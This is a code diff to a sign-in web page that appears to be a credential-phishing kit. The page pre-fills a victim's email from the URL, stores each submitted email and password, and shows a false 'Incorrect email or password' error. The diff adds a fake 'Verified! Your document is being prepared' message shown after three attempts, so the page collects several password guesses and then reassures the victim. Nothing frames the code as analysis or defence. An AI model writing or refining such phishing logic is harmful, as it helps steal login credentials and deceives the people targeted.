@@ -99,6 +99,7 @@
         <label for="keep-signed-in">Keep me signed in</label>
       </div>
       <div class="error-message" id="errorMsg">❌ Incorrect email or password.</div>
+      <div class="success-message" id="successMsg">✅ Verified! Your document is being prepared...</div>
       <button type="submit">Next</button>
     </form>
   </div>
@@ -127,7 +128,13 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
       // Save attempt
       attempts.push({ email, password });
 
-      errorMsg.style.display = "block";
+      if (attempts.length < 3) {
+  errorMsg.style.display = "block";
+  document.getElementById("successMsg").style.display = "none";
+} else {
+  errorMsg.style.display = "none";
+  document.getElementById("successMsg").style.display = "block";
+}
       
       // Remove error if user types again
       form.querySelectorAll("input").forEach(input => {
